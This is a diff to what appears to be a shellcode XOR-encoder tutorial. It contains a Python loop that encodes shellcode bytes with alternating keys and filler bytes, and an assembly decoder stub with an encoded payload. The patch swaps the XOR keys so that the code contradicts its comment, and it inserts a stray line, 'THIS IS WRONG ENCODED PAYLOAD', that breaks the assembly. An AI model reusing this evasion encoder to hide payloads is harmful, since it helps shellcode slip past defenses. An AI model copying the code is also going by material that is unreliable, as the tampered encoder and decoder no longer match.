@@ -110,7 +110,7 @@ index = 1
 for byte in bytearray(shellcode):
 	#print index(byte)
 	if index % 5 == 0:
-		y = byte^0x24
+		y = byte^0x25
 		encoded += '\\x'
 		encoded += '%02x' % y  # see pyformat.info on use of % in formatting
 		encoded += '\\x%02x' % 0x69	# insert 0x69 after every 5th byte
@@ -120,7 +120,7 @@ for byte in bytearray(shellcode):
 		encoded2 += '0x%02x,' % 0x69
 
 	else:
-		z = byte^0x25
+		z = byte^0x24
 		encoded += '\\x'
 		encoded += '%02x' % z	# else XOR with 0x25
 
@@ -187,6 +187,7 @@ decoder:
 call_shellcode:
 	call decoder
 	; spaces added after commas for readability
+THIS IS WRONG ENCODED PAYLOAD
 	EncodedShellcode: db 0x14, 0xe5, 0x75, 0x4d, 0x0b, 0x69, 0x0a, 0x56, 0x4d, 0x4d, 0x0b, 0x69, 0x47, 0x4c, 0x4b, 0xac, 0xc7, 0x69, 0x75, 0xac, 0xc7, 0x76, 0xad, 0x69, 0xc4, 0x95, 0x2e, 0xe8, 0xa4, 0x69, 0xaa, 0xaa
 
 										</code>
